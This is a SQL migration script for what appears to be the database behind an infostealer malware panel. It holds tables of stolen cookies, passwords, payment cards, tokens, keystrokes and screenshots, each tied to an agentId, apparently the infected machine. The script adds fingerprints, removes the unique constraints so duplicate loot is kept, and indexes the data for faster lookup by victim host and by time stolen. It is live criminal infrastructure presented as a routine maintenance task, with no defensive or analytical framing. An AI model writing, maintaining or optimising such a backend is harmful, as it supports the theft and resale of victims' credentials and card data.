-- ============================================
-- SAFE MIGRATION - ZERO DATA LOSS
-- ============================================

-- Step 1: Add fingerprint column to all tables
ALTER TABLE stolen_cookies ADD COLUMN fingerprint TEXT;
ALTER TABLE stolen_passwords ADD COLUMN fingerprint TEXT;
ALTER TABLE stolen_cards ADD COLUMN fingerprint TEXT;
ALTER TABLE stolen_tokens ADD COLUMN fingerprint TEXT;

-- Step 2: Populate fingerprint for existing data
-- Cookies
UPDATE stolen_cookies 
SET fingerprint = LOWER(
    HEX(RANDOMBLOB(16)) || '|' ||
    COALESCE(agentId, '') || '|' ||
    COALESCE(host, '') || '|' ||
    COALESCE(name, '') || '|' ||
    COALESCE(path, '') || '|' ||
    COALESCE(value, '')
);

-- Passwords
UPDATE stolen_passwords 
SET fingerprint = LOWER(
    HEX(RANDOMBLOB(16)) || '|' ||
    COALESCE(agentId, '') || '|' ||
    COALESCE(url, '') || '|' ||
    COALESCE(username, '') || '|' ||
    COALESCE(password, '')
);

-- Cards
UPDATE stolen_cards 
SET fingerprint = LOWER(
    HEX(RANDOMBLOB(16)) || '|' ||
    COALESCE(agentId, '') || '|' ||
    COALESCE(card_number, '') || '|' ||
    COALESCE(card_name, '')
);

-- Tokens
UPDATE stolen_tokens 
SET fingerprint = LOWER(
    HEX(RANDOMBLOB(16)) || '|' ||
    COALESCE(agentId, '') || '|' ||
    COALESCE(service, '') || '|' ||
    COALESCE(token, '')
);

-- Step 3: Drop problematic global unique indexes (SAFE - no data loss)
DROP INDEX IF EXISTS idx_unique_cookie_global;
DROP INDEX IF EXISTS idx_unique_password_global;
DROP INDEX IF EXISTS idx_unique_card_global;
DROP INDEX IF EXISTS idx_unique_token_global;

-- Step 4: Create NON-UNIQUE fingerprint indexes (allows duplicates)
CREATE INDEX idx_cookie_agent_fingerprint ON stolen_cookies(agentId, fingerprint);
CREATE INDEX idx_password_agent_fingerprint ON stolen_passwords(agentId, fingerprint);
CREATE INDEX idx_card_agent_fingerprint ON stolen_cards(agentId, fingerprint);
CREATE INDEX idx_token_agent_fingerprint ON stolen_tokens(agentId, fingerprint);

-- Step 5: Add timestamp indexes for faster queries
CREATE INDEX idx_cookies_stolen_at ON stolen_cookies(stolen_at DESC);
CREATE INDEX idx_passwords_stolen_at ON stolen_passwords(stolen_at DESC);
CREATE INDEX idx_cards_stolen_at ON stolen_cards(stolen_at DESC);
CREATE INDEX idx_tokens_stolen_at ON stolen_tokens(stolen_at DESC);

-- Step 6: Add composite indexes for common queries
CREATE INDEX idx_cookies_agent_host ON stolen_cookies(agentId, host);
CREATE INDEX idx_passwords_agent_url ON stolen_passwords(agentId, url);
CREATE INDEX idx_cards_agent ON stolen_cards(agentId);

-- Step 7: Clean up database
VACUUM;

-- Step 8: Verify migration
SELECT '✅ Migration complete! Data counts:' as status;
SELECT 'cookies' as table_name, COUNT(*) as total_rows FROM stolen_cookies
UNION ALL
SELECT 'passwords', COUNT(*) FROM stolen_passwords
UNION ALL
SELECT 'cards', COUNT(*) FROM stolen_cards
UNION ALL
SELECT 'tokens', COUNT(*) FROM stolen_tokens
UNION ALL
SELECT 'keystrokes', COUNT(*) FROM stolen_keystrokes
UNION ALL
SELECT 'screenshots', COUNT(*) FROM stolen_screenshots;
